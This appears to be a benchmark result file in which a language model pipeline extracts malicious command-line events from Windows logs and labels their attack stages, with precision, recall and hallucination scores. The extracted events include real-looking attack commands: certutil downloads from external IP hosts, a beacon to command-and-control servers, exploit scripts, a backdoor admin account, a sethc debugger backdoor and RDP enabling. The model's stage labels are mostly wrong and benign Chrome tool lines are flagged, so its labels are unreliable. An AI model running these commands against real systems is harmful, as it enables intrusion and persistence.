@@ -1,0 +1,190 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "software_reporter_tool.exe --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=YzNf24YYZfuvRHVbjuMFf3GpplnJ+CDak8V6SAZz --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment",
+        "stage": "Execution"
+      },
+      {
+        "command": "software_reporter_tool.exe --crash-handler '\"', ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "software_reporter_tool.exe --enable-crash-reporting --use-crash-handler-with-id=\"\\\\\\.\\pipe\\crashpad_6000_XJTPKPDSUGJHATOO\" --sandboxed-process-id=2 --init-done-notifier=600 --sandbox-mojo-pipe-token=10875049845061253074 --mojo-platform-channel-handle=568 --engine=2",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "software_reporter_tool.exe --url=https://clients2.google.com/cr/report --annotation=plat=Win32 --annotation=prod=ChromeFoil --annotation=ver=99.279.200 --initial-client-data=0x1c0,0x1c4,0x1c8,0x19c,0x1cc,0x7ff763b525a0,0x7ff763b525b0,0x7ff763b525c0",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wrote \u2192 C:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\em005_64.dll",
+        "stage": "Collection"
+      },
+      {
+        "command": "wrote \u2192 C:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\edls_64.dll",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.7.103:8080 ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "connected to \u2192 124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Discovery"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \\\"C:\\windows\\system32\\cmd.exe\\/f\\\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg.exe ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "winbrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "CertUtil.exe -hashfile C:\\Users\\Public\\PhpStudyPoc.py MD5",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "Cmd.exe /c \"cd /d   \"D:/phpStudy/WWW\"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /c \"cd /d \\\"D:/phpStudy/WWW\\\"&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "del /f /q PHPStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q WinBrute.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q administrator_pass.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q nbtscan.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q PAExec.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\sethc.exe\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "executed '\\\\192.168.0.95\\ADMIN$\\PAExec-2196-WIN2012-1.exe'",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "executed '\\\\192.168.0.244\\ADMIN$\\PAExec-4224-WIN2012-1.exe'",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attackers initially accessed the hosts through various means such as exploiting vulnerabilities, phishing, etc., leading to execution of commands in the context of different processes. Once inside, the attackers tried to evade detection by killing processes, deleting suspicious files, and modifying the Windows Defender configuration to disable certain threat detection capabilities. After accounting creation of multiple accounts, an attacker escalated privileges through manipulating some configurations. They then moved laterally between machines and gathered sensitive credential information.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 38259,
+      "completion_tokens": 5251,
+      "total_tokens": 43510,
+      "wall_clock_s": 63.269,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2571428571428571,
+      "recall": 0.9,
+      "f1": 0.39999999999999997,
+      "tp": 9,
+      "fp": 26,
+      "fn": 1
+    },
+    "stage": {
+      "precision": 0.02857142857142857,
+      "recall": 0.16666666666666666,
+      "f1": 0.048780487804878044,
+      "tp": 1,
+      "fp": 34,
+      "fn": 5,
+      "recall_partial": 0.5
+    },
+    "hallucination_rate": 0.17647058823529413,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 38259,
+      "completion_tokens": 5251,
+      "total_tokens": 43510,
+      "wall_clock_s": 63.269,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
